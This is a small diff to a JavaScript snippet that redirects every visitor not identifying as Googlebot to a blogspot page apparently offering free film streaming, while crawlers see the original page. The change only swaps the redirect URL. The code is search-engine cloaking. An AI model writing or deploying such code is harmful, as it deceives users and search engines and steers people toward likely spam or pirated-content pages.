@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://seriestvshowsport.blogspot.com/2026/10/film-film-ua-potyag-chervona-ruta-2026-divitisya-onlayn-bezkoshtovno-v-khoroshiy-v1.html";
+  window.location.href = "https://seriestvshowsport.blogspot.com/2026/10/filmua-2026-hd.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
